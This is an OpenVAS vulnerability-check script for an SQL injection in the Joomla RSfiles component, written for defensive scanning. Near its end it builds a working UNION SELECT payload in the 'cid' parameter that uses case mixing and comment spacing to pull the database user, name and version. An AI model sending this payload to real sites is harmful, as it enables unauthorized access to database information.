###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_rsfiles_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Joomla RSfiles SQL Injection Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to inject or manipulate
  SQL queries in the back-end database, allowing for the manipulation or
  disclosure of arbitrary data.
  Impact Level: Application";

tag_affected = "Joomla RSfiles";
tag_insight = "Input passed via the 'cid' GET parameter to index.php (when 'option' is set
  to 'com_rsfiles', 'view' is set to 'files', 'layout' is set to 'agreement',
  and 'tmpl' is set to 'component') is not properly sanitised before being
  used in a SQL query.";
tag_solution = "No solution or patch is available as of 20th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.rsjoomla.com/joomla-extensions/joomla-download-manager.html";
tag_summary = "This host is installed with Joomla RSfiles and is prone to
  sql injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803441";
CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_bugtraq_id(58547);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-20 15:59:21 +0530 (Wed, 20 Mar 2013)");
  script_name("Joomla RSfiles SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.com/91448");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52668");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24851");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/52668");
  script_xref(name : "URL" , value : "http://www.madleets.com/Thread-Joomla-Component-RSfiles-cid-SQL-injection-Vulnerability");

  script_description(desc);
  script_summary("Check if Joomla RSfiles is vulnerable sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct attack request
url = string(dir, "/index.php?option=com_rsfiles&view=files&layout=agreement&",
                  "tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONC",
                  "AT_WS(CHAR(32,58,32),user(),database(),version())--");

## Check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE,
      pattern:"File:", extra_check:make_list("I Agree", "I Disagree")))
{
  security_hole(port);
  exit(0);
}
